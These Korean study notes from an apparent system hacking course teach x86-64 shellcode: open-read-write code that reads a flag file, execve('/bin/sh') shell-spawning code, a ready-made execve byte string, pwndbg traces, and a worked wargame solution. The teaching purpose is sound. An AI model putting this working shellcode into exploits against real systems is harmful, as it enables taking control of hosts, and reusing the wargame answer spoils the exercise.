# STAGE 4 Shellcode

# Exploit Tech: Shellcode

## 1. 서론

### 들어가며

- 해킹 분야에서 상대 시스템을 공격하는 것을 익스플로잇(Exploit)이라고 부름
    - 시스템 해킹의 익스플로잇과 관련된 총 9가지 공격 기법 소개
- 첫 번째 공격기법 : 셸코드

### 셸코드

- **셸코드(Shellcode)**는 익스플로잇을 위해 제작된 어셈블리 코드 조각
    - 일반적으로 셸을 획득하기 위한 목적으로 셸코드를 사용해서, “셸”이라는 접두사가 붙음
    - 셸을 획득하는 것은 시스템 해킹의 관점에서 매우 중요
- rip를 셸코드로 옮길 수 있으면 원하는 어셈블리 코드가 실행되게 할 수 있음
    - 어셈블리어는 기계어와 거의 일대일 대응되므로 사실상 원하는 모든 명령을 CPU에 내릴 수 있게 됨
- 셸코드는 어셈블리어로 구성되므로 공격을 수행할 대상 아키텍처와 운영체제에 따라, 그리고 셸코드의 목적에 따라 다르게 작성
    - 최적의 셸코드는 일반적으로 직접 작성
    - [Shellcodes database for study cases](http://shell-storm.org/shellcode/index.html)
- **파일 읽고 쓰기(open-read-write, orw)**, **셸 획득(execve)**과 관련된 셸코드를 살펴볼 것

## 2. orw 셸코드

### orw 셸코드 작성

```c
char buf[0x30];

int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30); 
write(1, buf, 0x30);
```

```nasm
;Name: S4_00_orw.s

push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)

mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

- orw 셸코드는 파일을 열고, 읽은 뒤 화면에 출력해주는 셸코드
    - “/tmp/flag”를 읽는 셸코드를 작성
    - 구현하려는 셸코드의 동작을 C언어 형식의 의사코드로 표현
- orw 셸코드를 작성하기 위해 알아야 하는 *syscall*
    
    
    | %rax | system call | %rdi | %rsi | %rdx | %rcx | %r8 | %r9 |
    | --- | --- | --- | --- | --- | --- | --- | --- |
    | 0 | sys_read | unsigned int fd | char *buf | size_t count |  |  |  |
    | 1 | sys_write | unsigned int fd | const char *buf | size_t count |  |  |  |
    | 2 | sys_open | const char *filename | int flags | int mode |  |  |  |

```c
// https://code.woboq.org/userspace/glibc/bits/fcntl.h.html#24
/* File access modes for `open' and `fcntl'. */
#define        O_RDONLY        0        /* Open read-only.  */
#define        O_WRONLY        1        /* Open write-only.  */
#define        O_RDWR          2        /* Open read/write.  */
```

- fd란?
    - **파일 서술자(File Descriptor, fd)**는 유닉스 계열의 운영체제에서 파일에 접근하는 소프트웨어에 제공하는 가상의 접근 제어자
        - 프로세스마다 고유의 서술자 테이블을 갖고 있으며, 그 안에 여러 파일 서술자를 저장
        - 서술자 각각은 번호로 구별되는데, 일반적으로 0번은 일반 입력(Standard Input, STDIN), 1번은 일반 출력(Standard Output, STDOUT), 2번은 일반 오류(Standard Error, STDERR)에 할당되어 있으며, 이들은 프로세스를 터미널과 연결
    - 프로세스가 생성된 이후, 위의 open같은 함수를 통해 어떤 파일과 프로세스를 연결하려고 하면, 기본으로 할당된 2번 이후의 번호를 새로운 fd에 차례로 할당

---

```nasm
push 0x67
mov rax, 0x616c662f706d742f 
push rax
mov rdi, rsp    ; rdi = "/tmp/flag"
xor rsi, rsi    ; rsi = 0 ; RD_ONLY
xor rdx, rdx    ; rdx = 0
mov rax, 2      ; rax = 2 ; syscall_open
syscall         ; open("/tmp/flag", RD_ONLY, NULL)
```

1. int fd = open(“/tmp/flag”, O_RDONLY, NULL)
    - “/tmp/flag”라는 문자열을 메모리에 위치
        - 스택에 `0x616c662f706d742f67(/tmp/flag)`를 *push*하여 위치
        - 스택에는 8 바이트 단위로만 값을 *push*할 수 있으므로 `0x67`를 우선 *push*한 후, `0x616c662f706d742f`를 *push*
        - *rdi*가 이를 가리키도록 *rsp*를 *rdi*로 옮김
    - *O_RDONLY*는 0이므로, *rsi*는 0으로 설정
    - 파일을 읽을 때, *mode*는 의미를 갖지 않으므로, *rdx*는 0으로 설정
    - *rax*를 `open` 의 syscall 값인 2로 설정

---

```nasm
mov rdi, rax      ; rdi = fd
mov rsi, rsp
sub rsi, 0x30     ; rsi = rsp-0x30 ; buf
mov rdx, 0x30     ; rdx = 0x30     ; len
mov rax, 0x0      ; rax = 0        ; syscall_read
syscall           ; read(fd, buf, 0x30)
```

1. read(fd, buf, 0x30)
    - syscall의 반환 값은 *rax*로 저장됨
        - `open` 으로 획득한 /tmp/flag의 *fd*는 *rax*에 저장
        - read의 첫 번째 인자를 이 값으로 설정해야 하므로 *rax*를 *rdi*에 대입
    - *rsi*는 파일에서 읽은 데이터를 저장할 주소를 가리킴
        - 0x30만큼 읽을 것이므로, *rsi*에 *rsp-0x30*을 대입
    - *rdx*는 파일로부터 읽어낼 데이터의 길이인 0x30으로 설정
    - `read` 시스템콜을 호출하기 위해서 *rax*를 0으로 설정

---

```nasm
mov rdi, 1        ; rdi = 1 ; fd = stdout
mov rax, 0x1      ; rax = 1 ; syscall_write
syscall           ; write(fd, buf, 0x30)
```

1. write(1, buf, 0x30)
    - 출력은 *stdout*으로 할 것이므로, *rdi*를 0x1로 설정
    - *rsi*와 *rdx*는 `read` 에서 사용한 값을 그대로 사용
    - `write` 시스템콜을 호출하기 위해서 *rax*를 1로 설정

### orw 셸코드 컴파일 및 실행

```c
/*
 * Name: S4_01_sh-skeleton.c
 * $ gcc -o S4_01_sh-skeleton S4_01_sh-skeleton.c -masm=intel
 */

__asm__
(
	".global run_sh\n"
	"run_sh:\n"
	"Input your shellcode here.\n"
	"Each line of your shellcode should be\n"
	"seperated by '\n'\n"
	"xor rdi, rdi   # rdi = 0\n"
	"mov rax, 0x3c	# rax = sys_exit\n"
	"syscall        # exit(0)"
);

void run_sh();

int main(void)
{
	run_sh();
}
```

```c
/*
 * Name: S4_02_orw.c
 * $ gcc -o S4_02_orw S4_02_orw.c -masm=intel
 */

__asm__
(
	".global run_sh\n"
	"run_sh:\n"
	"push 0x67\n"
	"mov rax, 0x616c662f706d742f \n"
	"push rax\n"
	"mov rdi, rsp    # rdi = '/tmp/flag'\n"
	"xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
	"xor rdx, rdx    # rdx = 0\n"
	"mov rax, 2      # rax = 2 ; syscall_open\n"
	"syscall         # open('/tmp/flag', RD_ONLY, NULL)\n"
	"\n"
	"mov rdi, rax      # rdi = fd\n"
	"mov rsi, rsp\n"
	"sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
	"mov rdx, 0x30     # rdx = 0x30     ; len\n"
	"mov rax, 0x0      # rax = 0        ; syscall_read\n"
	"syscall           # read(fd, buf, 0x30)\n"
	"\n"
	"mov rdi, 1        # rdi = 1 ; fd = stdout\n"
	"mov rax, 0x1      # rax = 1 ; syscall_write\n"
	"syscall           # write(fd, buf, 0x30)\n"
	"\n"
	"xor rdi, rdi      # rdi = 0\n"
	"mov rax, 0x3c	   # rax = sys_exit\n"
	"syscall		   # exit(0)"
);

void run_sh();

int main(void)
{
	run_sh();
}
```

- 대부분의 운영체제는 실행 가능한 파일의 형식을 규정
    - [윈도우의 PE](https://en.wikipedia.org/wiki/Portable_Executable)
    - [리눅스의 ELF](https://en.wikipedia.org/wiki/Executable)
        - *ELF(Executable and Linkable Format)*는 크게 헤더와 코드 그리고 기타 데이터로 구성
        - 헤더에는 실행에 필요한 여러 정보가 적혀 있고, 코드에는 CPU가 이해할 수 있는 기계어 코드가 적혀있음
- 작성한 셸코드 `S4_00_orw.s`는 아스키로 작성된 어셈블리 코드이므로, 기계어로 치환하면 CPU가 이해할 수는 있으나 ELF형식이 아니므로 리눅스에서 실행될 수 없음
    - *gcc* 컴파일을 통해 이를 ELF형식으로 변형해야함
- 컴파일
    - 어셈블리 코드를 컴파일하는 방법에는 여러 가지가 있을 수 있으나, 셸코드를 실행할 수 있는 스켈레톤 코드를 C언어로 작성하고, 거기에 셸코드를 탑재하는 방법을 사용
    - 스켈레톤 코드는 핵심 내용이 비어있는, 기본 구조만 갖춘 코드
        - 스켈레톤 코드에 앞에서 작성한 셸코드를 채움
- 실행
    - 셸코드가 실제로 작동함을 확인하기 위해 */tmp/flag* 파일을 생성
        - `$ echo 'flag{this_is_open_read_write_shellcode!}' > /tmp/flag`
    - *orw.c*를 컴파일하고, 실행
        - `$ gcc -o S4_02_orw S4_02_orw.c -masm=intel`
        - `$ ./S4_02_orw`
    - 셸코드가 성공적으로 실행되면 저장한 문자열이 출력되는 것을 확인할 수 있음
    - `/tmp/flag` 의 내용 말고도 몇 자의 알 수 없는 문자열들이 출력되는 경우가 있음

### orw 셸코드 디버깅

```nasm
$ gdb S4_02_orw -q
pwndbg: loaded 147 pwndbg commands and 45 shell commands. Type pwndbg [--shell | --all] [filter] for a list.
pwndbg: created $rebase, $ida GDB functions (can be used with print/break)
Reading symbols from S4_02_orw...
(No debugging symbols found in S4_02_orw)
------- tip of the day (disable with set show-tips off) -------
The $heap_base GDB variable can be used to refer to the starting address of the heap after running the heap command
pwndbg> b *run_sh
Breakpoint 1 at 0x1129
pwndbg> r
Starting program: /home/.../S4_02_orw 

Breakpoint 1, 0x0000555555555129 in run_sh ()
...
*RIP  0x555555555129 (run_sh) ◂— push 0x67
[ DISASM / x86-64 / set emulate on ]
 ► 0x555555555129 <run_sh>       push   0x67
   0x55555555512b <run_sh+2>     movabs rax, 0x616c662f706d742f
   0x555555555135 <run_sh+12>    push   rax
   0x555555555136 <run_sh+13>    mov    rdi, rsp
   0x555555555139 <run_sh+16>    xor    rsi, rsi
   0x55555555513c <run_sh+19>    xor    rdx, rdx
   0x55555555513f <run_sh+22>    mov    rax, 2
   0x555555555146 <run_sh+29>    syscall 
   0x555555555148 <run_sh+31>    mov    rdi, rax
   0x55555555514b <run_sh+34>    mov    rsi, rsp
   0x55555555514e <run_sh+37>    sub    rsi, 0x30
...
pwndbg>
```

- *gdb*를 통해 작성한 셸코드의 동작을 분석
    - `S4_02_orw`를 *gdb*로 열고, `run_sh()`에 브레이크 포인트 설정
- `run` 명령어로 `run_sh()`의 시작 부분까지 코드를 실행
    - 작성한 셸코드에 *rip*가 위치한 것을 확인

---

```nasm
pwndbg> b *run_sh+29
Breakpoint 2 at 0x555555555146
pwndbg> c
Continuing.

Breakpoint 2, 0x0000555555555146 in run_sh ()
...
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX  0x2
 RBX  0x5555555551a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x5555555551a0 (__libc_csu_init) ◂— endbr64 
*RDX  0x0
*RDI  0x7fffffffde78 ◂— '/tmp/flag'
*RSI  0x0
...
[ DISASM / x86-64 / set emulate on ]
   0x555555555135 <run_sh+12>    push   rax
   0x555555555136 <run_sh+13>    mov    rdi, rsp
   0x555555555139 <run_sh+16>    xor    rsi, rsi
   0x55555555513c <run_sh+19>    xor    rdx, rdx
   0x55555555513f <run_sh+22>    mov    rax, 2
 ► 0x555555555146 <run_sh+29>    syscall  <SYS_open>
        file: 0x7fffffffde78 ◂— '/tmp/flag'
        oflag: 0x0
        vararg: 0x0
   0x555555555148 <run_sh+31>    mov    rdi, rax
   0x55555555514b <run_sh+34>    mov    rsi, rsp
   0x55555555514e <run_sh+37>    sub    rsi, 0x30
   0x555555555152 <run_sh+41>    mov    rdx, 0x30
   0x555555555159 <run_sh+48>    mov    rax, 0
...
pwndbg> ni
0x0000555555555148 in run_sh ()
...
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX  0x3
 RBX  0x5555555551a0 (__libc_csu_init) ◂— endbr64 
*RCX  0x555555555044 (_start+4) ◂— xor ebp, ebp
 RDX  0x0
 RDI  0x7fffffffde78 ◂— '/tmp/flag'
 RSI  0x0
...
[ DISASM / x86-64 / set emulate on ]
   0x555555555136 <run_sh+13>    mov    rdi, rsp
   0x555555555139 <run_sh+16>    xor    rsi, rsi
   0x55555555513c <run_sh+19>    xor    rdx, rdx
   0x55555555513f <run_sh+22>    mov    rax, 2
   0x555555555146 <run_sh+29>    syscall 
 ► 0x555555555148 <run_sh+31>    mov    rdi, rax
   0x55555555514b <run_sh+34>    mov    rsi, rsp
   0x55555555514e <run_sh+37>    sub    rsi, 0x30
   0x555555555152 <run_sh+41>    mov    rdx, 0x30
   0x555555555159 <run_sh+48>    mov    rax, 0
   0x555555555160 <run_sh+55>    syscall 
...
pwndbg>
```

1. int fd = open(“/tmp/flag”, O_RDONLY, NULL)
    - 첫번째 `syscall` 이 위치한 `run_sh+29` 에 브레이크 포인트를 설정한 후 실행하여, 해당 시점에 syscall에 들어가는 인자를 확인
    - *pwndbg* 플러그인은 *syscall*을 호출할 때, 위 결과와 같이 인자를 해석해서 보여줌
        - `open(“/tmp/flag”, O_RDONLY, NULL);`가 실행됨을 확인
    - `ni` 명령어로 `syscall` 을 실행하고 나면, *open* 시스템 콜을 수행한 결과로 */tmp/flag*의 *fd(3)*가 *rax*에 저장

---

```nasm
pwndbg> b *run_sh+55
Breakpoint 3 at 0x555555555160
pwndbg> c
Continuing.

Breakpoint 3, 0x0000555555555160 in run_sh ()
...
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX  0x0
 RBX  0x5555555551a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x555555555044 (_start+4) ◂— xor ebp, ebp
*RDX  0x30
*RDI  0x3
*RSI  0x7fffffffde48 —▸ 0x7fffffffde77 ◂— 0x6c662f706d742f00
...
[ DISASM / x86-64 / set emulate on ]
   0x555555555148 <run_sh+31>    mov    rdi, rax
   0x55555555514b <run_sh+34>    mov    rsi, rsp
   0x55555555514e <run_sh+37>    sub    rsi, 0x30
   0x555555555152 <run_sh+41>    mov    rdx, 0x30
   0x555555555159 <run_sh+48>    mov    rax, 0
 ► 0x555555555160 <run_sh+55>    syscall  <SYS_read>
        fd: 0x3 (/tmp/flag)
        buf: 0x7fffffffde48 —▸ 0x7fffffffde77 ◂— 0x6c662f706d742f00
        nbytes: 0x30
   0x555555555162 <run_sh+57>    mov    rdi, 1
   0x555555555169 <run_sh+64>    mov    rax, 1
   0x555555555170 <run_sh+71>    syscall 
   0x555555555172 <run_sh+73>    xor    rdi, rdi
   0x555555555175 <run_sh+76>    mov    rax, 0x3c
...
pwndbg> ni
0x0000555555555162 in run_sh ()
...
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX  0x29
 RBX  0x5555555551a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x555555555044 (_start+4) ◂— xor ebp, ebp
 RDX  0x30
 RDI  0x3
 RSI  0x7fffffffde48 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
...
[ DISASM / x86-64 / set emulate on ]
   0x55555555514b <run_sh+34>    mov    rsi, rsp
   0x55555555514e <run_sh+37>    sub    rsi, 0x30
   0x555555555152 <run_sh+41>    mov    rdx, 0x30
   0x555555555159 <run_sh+48>    mov    rax, 0
   0x555555555160 <run_sh+55>    syscall 
 ► 0x555555555162 <run_sh+57>    mov    rdi, 1
   0x555555555169 <run_sh+64>    mov    rax, 1
   0x555555555170 <run_sh+71>    syscall 
   0x555555555172 <run_sh+73>    xor    rdi, rdi
   0x555555555175 <run_sh+76>    mov    rax, 0x3c
   0x55555555517c <run_sh+83>    syscall 
...
pwndbg> x/s 0x7fffffffde48
0x7fffffffde48: "flag{this_is_open_read_write_shellcode!}\n"
pwndbg>
```

1. read(fd, buf, 0x30)
    - 두 번째 `syscall` 이 위치한 `run_sh+55` 에 브레이크 포인트를 설정하고 실행하여, 해당 시점에 syscall에 들어가는 인자를 확인
    - 새로 할당한 */tmp/flag*의 *fd(3)*에서 데이터를 0x30바이트만큼 읽어서 0x7fffffffde48에 저장
    - `ni` 명령어로 `syscall` 을 실행
    - `REGISTERS` 부분의 RSI를 통해서 파일의 내용이 0x7fffffffde48에 저장되었음을 알 수 있음
        - `x/s` 명령어로도 확인

---

```nasm
pwndbg> b *run_sh+71
Breakpoint 4 at 0x555555555170
pwndbg> c
Continuing.

Breakpoint 4, 0x0000555555555170 in run_sh ()
...
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX  0x1
 RBX  0x5555555551a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x555555555044 (_start+4) ◂— xor ebp, ebp
 RDX  0x30
*RDI  0x1
 RSI  0x7fffffffde48 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
...
[ DISASM / x86-64 / set emulate on ]
   0x555555555152 <run_sh+41>    mov    rdx, 0x30
   0x555555555159 <run_sh+48>    mov    rax, 0
   0x555555555160 <run_sh+55>    syscall 
   0x555555555162 <run_sh+57>    mov    rdi, 1
   0x555555555169 <run_sh+64>    mov    rax, 1
 ► 0x555555555170 <run_sh+71>    syscall  <SYS_write>
        fd: 0x1 (/dev/pts/0)
        buf: 0x7fffffffde48 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
        n: 0x30
   0x555555555172 <run_sh+73>    xor    rdi, rdi
   0x555555555175 <run_sh+76>    mov    rax, 0x3c
   0x55555555517c <run_sh+83>    syscall 
   0x55555555517e <main>         endbr64 
   0x555555555182 <main+4>       push   rbp
...
pwndbg> ni
flag{this_is_open_read_write_shellcode!}
0x0000555555555172 in run_sh ()
...
[ REGISTERS / show-flags off / show-compact-regs off ]
*RAX  0x30
 RBX  0x5555555551a0 (__libc_csu_init) ◂— endbr64 
 RCX  0x555555555044 (_start+4) ◂— xor ebp, ebp
 RDX  0x30
 RDI  0x1
 RSI  0x7fffffffde48 ◂— 'flag{this_is_open_read_write_shellcode!}\n'
...
[ DISASM / x86-64 / set emulate on ]
   0x555555555159 <run_sh+48>    mov    rax, 0
   0x555555555160 <run_sh+55>    syscall 
   0x555555555162 <run_sh+57>    mov    rdi, 1
   0x555555555169 <run_sh+64>    mov    rax, 1
   0x555555555170 <run_sh+71>    syscall 
 ► 0x555555555172 <run_sh+73>    xor    rdi, rdi
   0x555555555175 <run_sh+76>    mov    rax, 0x3c
   0x55555555517c <run_sh+83>    syscall 
   0x55555555517e <main>         endbr64 
   0x555555555182 <main+4>       push   rbp
   0x555555555183 <main+5>       mov    rbp, rsp
...
pwndbg>
```

1. write(1, buf, 0x30)
    - 읽어낸 데이터를 출력하는 write 시스템 콜을 실행하기 직전 관찰
    - `ni` 명령어로 실행하면, 데이터를 저장한 0x7fffffffe2c8에서 48바이트를 출력

### 초기화되지 않은 메모리 영역 사용

- */tmp/flag*의 데이터 외에 알 수 없는 문자열이 출력되는 경우
    - 초기화되지 않은 메모리 영역 사용에 의한 것
- 스택은 다양한 함수들이 공유하는 메모리 자원
    - 각 함수가 자신들의 스택 프레임을 할당해서 사용하고, 종료될 때 해제
    - 스택에서 해제라는 것은 사용한 영역을 0으로 초기화하는 것이 아니라, 단순히 *rsp*와 *rbp*를 호출한 함수의 것으로 이동시키는 것
    - 어떤 함수를 해제한 이후, 다른 함수가 스택 프레임을 그 위에 할당하면, 이전 스택 프레임의 데이터는 여전히 새로 할당한 스택 프레임에 존재하게 됨
        - 이를 *쓰레기 값(garbage data)*이라고 표현
    - 프로세스는 쓰레기 값 때문에 때때로 예상치 못한 동작을 하기도 하며, 해커에게 의도치 않게 중요한 정보를 노출
        - 안전한 프로그램을 작성하려면 스택이나 힙을 사용할 때 항상 적절한 초기화 과정을 거쳐야 함
- 알 수 없는 값이 함께 출력되는 경우, read 시스템 콜을 실행한 직후로 돌아가 원인을 분석해볼 수 있음
    - 48바이트 중
        - 앞의 41바이트만 flag{this_is_open_read_write_shellcode!} 데이터
        - 마지막 7바이트는 널 바이트
    - 뒤 7바이트가 널 바이트가 아닌 쓰레기 값이 들어 있는 경우
        - 쓰레기 값이 나중에 write시스템콜을 수행할 때, 플래그와 함께 출력
    - 쓰레기 값은 아무 의미 없는 값이 아님
        - 쓰레기 값은 어셈블리 코드의 주소나 어떤 메모리의 주소일 수 있음
        - 해당 값을 유출해 내는 작업을 **메모리 릭(Memory Leak)**이라고 부르며, 보호기법들을 무력화하는 핵심 역할을 함

## 3. execve 셸코드

### execve 셸코드

| %rax | system call | %rdi | %rsi | %rdx | %rcx | %r8 | %r9 |
| --- | --- | --- | --- | --- | --- | --- | --- |
| 0x3b (59) | sys_execve | const char *filename | const char *const argv[] | const char *const envp[] |  |  |  |

```nasm
;Name: S4_03_execve.s

mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

```c
/*
 * Name: S4_04_execve.c
 * $ gcc -o S4_04_execve S4_04_execve.c -masm=intel
 */

__asm__
(
	".global run_sh\n"
	"run_sh:\n"
	"mov rax, 0x68732f6e69622f\n"
	"push rax\n"
	"mov rdi, rsp  # rdi = '/bin/sh'\n"
	"xor rsi, rsi  # rsi = NULL\n"
	"xor rdx, rdx  # rdx = NULL\n"
	"mov rax, 0x3b # rax = sys_execve\n"
	"syscall       # execve('/bin/sh', null, null)\n"
	"xor rdi, rdi   # rdi = 0\n"
	"mov rax, 0x3c	# rax = sys_exit\n"
	"syscall        # exit(0)"
);

void run_sh();

int main(void)
{
	run_sh();
}
```

```bash
bash $ gcc -o S4_04_execve S4_04_execve.c -masm=intel
bash $ ./S4_04_execve
sh $
uid=1001...
sh $ clear
TERM environment variable not set.
sh $
```

- **셸(Shell, 껍질)**이란 운영체제에 명령을 내리기 위해 사용되는 사용자의 인터페이스
    - 운영체제의 핵심 기능을 하는 프로그램을 **커널(Kernel, 호두 속 내용물)**과 대비됨
    - 셸을 획득하면 시스템을 제어할 수 있게 되므로 통상적으로 셸 획득을 시스템 해킹의 성공으로 여김
- **execve 셸코드**는 임의의 프로그램을 실행하는 셸코드인데, 이를 이용하면 서버의 셸을 획득할 수 있음
    - 다른 언급없이 셸코드라고 하면 이를 의미하는 경우가 많음
- 최신의 리눅스는 대부분 *sh, bash*를 기본 셸 프로그램으로 탑재하고 있으며, 이 외에도 *zsh, tsh* 등의 셸을 유저가 설치해서 사용할 수 있음
    - */bin/sh*를 실행하는 execve 셸코드를 작성
- execve(”/bin/sh”, null, null)
    - execve 셸코드는 execve 시스템 콜만으로 구성
    - *argv*는 실행 파일에 넘겨줄 인자, *envp*는 환경 변수
    - sh만 실행하면 되므로 다른 값들은 전부 *null*로 설정해줘도 됨
    - 리눅스에서는 기본 실행 프로그램들이 */bin/* 디렉토리에 저장
        - *sh* 역시 여기에 저장
    - 따라서 execve(“/bin/sh”, null, null)을 실행하는 것을 목표로 셸 코드를 작성

### objdump 를 이용한 shellcode 추출

```nasm
; File name: S4_05_shellcode.asm
section .text
global _start
_start:
xor    eax, eax
push   eax
push   0x68732f2f
push   0x6e69622f
mov    ebx, esp
xor    ecx, ecx
xor    edx, edx
mov    al, 0xb
int    0x80
```

```bash
# step1-S4_05_shellcode.o
$ sudo apt-get install nasm
$ nasm -f elf S4_05_shellcode.asm
$ objdump -d S4_05_shellcode.o

S4_05_shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    %eax,%eax
   2:   50                      push   %eax
   3:   68 2f 2f 73 68          push   $0x68732f2f
   8:   68 2f 62 69 6e          push   $0x6e69622f
   d:   89 e3                   mov    %esp,%ebx
   f:   31 c9                   xor    %ecx,%ecx
  11:   31 d2                   xor    %edx,%edx
  13:   b0 0b                   mov    $0xb,%al
  15:   cd 80                   int    $0x80

# step2-S4_05_shellcode.bin
$ objcopy --dump-section .text=S4_05_shellcode.bin S4_05_shellcode.o
$ xxd S4_05_shellcode.bin
00000000: 31c0 5068 2f2f 7368 682f 6269 6e89 e331  1.Ph//shh/bin..1
00000010: c931 d2b0 0bcd 80                        .1.....

# shellcode string, execve /bin/sh shellcode: 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80"
```

- 작성한 shellcode를 byte code(opcode)의 형태로 추출하는 방법
    - shellcode.asm 에 대해서 이를 바이트 코드로 바꾸는 과정

## 4. 마치며

### Summary

- 셸 코드 작성법을 알았다고 해서 바로 시스템 해킹에 사용할 수는 없음
    - Return Address Overwrite과 같은 공격 기법들과 연계하면 강력한 공격 수단으로 활용될 수 있음

### No. 1

- 파일 지정자들의 번호
    - `stdin = 0`
    - `stdout = 1`
    - `stderr = 2`
- 리눅스에서 fd 0번은 표준 입력(stdin), 1번은 표준 출력(stdout), 2번은 표준 에러 출력(stderr)에 지정되어 있음

### No. 2

```nasm
pwndbg> x/s 0x7fffffffc278
"/bin/sh\x00"
mov rdi, (a)  
xor rsi, rsi 
xor rdx, rdx 
mov rax, (b)  
syscall
```

- execve로 셸을 획득하려 할 때, 다음 셸코드의 빈칸?
    - (a) : `0x7fffffffc278`
    - (b) : `0x3b`
- 리눅스 x86-64 아키텍처에서, 시스템 콜의 종류는 rax로 지정
- 인자는 rdi, rsi, rdx, rcx, r8, r9 .. 순서로 전달
- execve의 번호는 59(0x3b)이고, 실행하려는 시스템 콜의 형태는 execve("/bin/sh", NULL, NULL) 이므로 rdi는 0x7fffffffc278

# Wargame: Shell Basic

## 1. shell_basic

### Description

- 입력한 셸코드를 실행하는 프로그램이 서비스로 등록되어 작동
- `main` 함수가 아닌 다른 함수들은 execve, execveat 시스템 콜을 사용하지 못하도록 하며, 풀이와 관련이 없는 함수
- flag 파일의 위치와 이름은 `/home/shell_basic/flag_name_is_loooooong`
- 플래그 형식은 `DH{...}`  `DH{` 와 `}` 도 모두 포함하여 인증

### 참고

```nasm
$ cat write.asm
section .text
global _start
_start:
	;/* write(fd=1, buf='hello', n=48) */
	;/* push 'hello\x00' */
	mov rax, 0x0a6f6c6c6568
	push rax
	mov rsi, rsp
	push 1
	pop rdi
	push 0x6
	pop rdx
	;/* call write() */
	push 1
	pop rax
	syscall
$ nasm -f elf64 write.asm
$ objcopy --dump-section .text=write.bin write.o
$ xxd write.bin
00000000: 48b8 6865 6c6c 6f0a 0000 5048 89e6 6a01  H.hello...PH..j.
00000010: 5f6a 065a 6a01 580f 05                   _j.Zj.X..
$ cat write.bin | ./shell_basic
shellcode: hello
[1]    1592460 done                cat write.bin |
1592461 segmentation fault  ./shell_basic
$
```

### shell_basic

```c
/*
 * Name: S4_06_shell_basic.c
 * $ gcc -o S4_06_shell_basic S4_06_shell_basic.c -masm=intel
 *
 * char buf[0x30];
 *
 * int fd = open("/tmp/flag", RD_ONLY, NULL);
 * read(fd, buf, 0x30); 
 * write(1, buf, 0x30);
 *
 * /home/shell_basic/flag_name_is_loooooong
 * 2F 68 6F 6D 65 2F 73 68 /home/sh
 * 65 6C 6C 5F 62 61 73 69 ell_basi
 * 63 2F 66 6C 61 67 5F 6E c/flag_n
 * 61 6D 65 5F 69 73 5F 6C ame_is_l
 * 6F 6F 6F 6F 6F 6F 6E 67 oooooong
 */

__asm__
(
	".global run_sh\n"
	"run_sh:\n"
	/**
	 * function: open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)
	 *
	 * param:
	 * @rax: 2
	 * @syscall: sys_open
	 * @rdi: const char *filename
	 * @rsi: int flags
	 * @rdx: int mode
	 */
	"push 0x0 # NULL\n"
	"mov rax, 0x676e6f6f6f6f6f6f # oooooong\n"
	"push rax\n"
	"mov rax, 0x6c5f73695f656d61 # ame_is_l\n"
	"push rax\n"
	"mov rax, 0x6e5f67616c662f63 # c/flag_n\n"
	"push rax\n"
	"mov rax, 0x697361625f6c6c65 # ell_basi\n"
	"push rax\n"
	"mov rax, 0x68732f656d6f682f # /home/sh\n"
	"push rax\n"
	"mov rdi, rsp    # rdi = '/home/shell_basic/flag_name_is_loooooong'\n"
	"xor rsi, rsi    # rsi = 0 ; RD_ONLY\n"
	"xor rdx, rdx    # rdx = 0\n"
	"mov rax, 2      # rax = 2 ; syscall_open\n"
	"syscall         # open('/home/shell_basic/flag_name_is_loooooong', RD_ONLY, NULL)\n"
	"\n"
	/**
	 * function: write(1, buf, 0x30);
	 *
	 * param:
	 * @rax: 1
	 * @syscall: sys_write
	 * @rdi: unsigned int fd
	 * @rsi: const char *buf
	 * @rdx: size_t count
	 */
	"mov rdi, rax      # rdi = fd\n"
	"mov rsi, rsp\n"
	"sub rsi, 0x30     # rsi = rsp-0x30 ; buf\n"
	"mov rdx, 0x30     # rdx = 0x30     ; len\n"
	"mov rax, 0x0      # rax = 0        ; syscall_read\n"
	"syscall           # read(fd, buf, 0x30)\n"
	"\n"
	/**
	 * function: read(fd, buf, 0x30)
	 *
	 * param:
	 * @rax: 0
	 * @syscall: sys_read
	 * @rdi: unsigned int fd
	 * @rsi: char *buf
	 * @rdx: size_t count
	 */
	"mov rdi, 0x1      # rdi = 1 ; fd = stdout\n"
	"mov rax, 0x1      # rax = 1 ; syscall_write\n"
	"syscall           # write(fd, buf, 0x30)\n"
	"\n"

	/**
	 * function: exit(0)
	 *
	 * param:
	 * @rax: 0x3c (decimal: 60)
	 * @syscall: sys_exit
	 * @rdi: int error_code
	 */
	"xor rdi, rdi   # rdi = 0\n"
	"mov rax, 0x3c	# rax = sys_exit\n"
	"syscall        # exit(0)"
);

void run_sh();

int main(void)
{
	run_sh();
}
```

```nasm
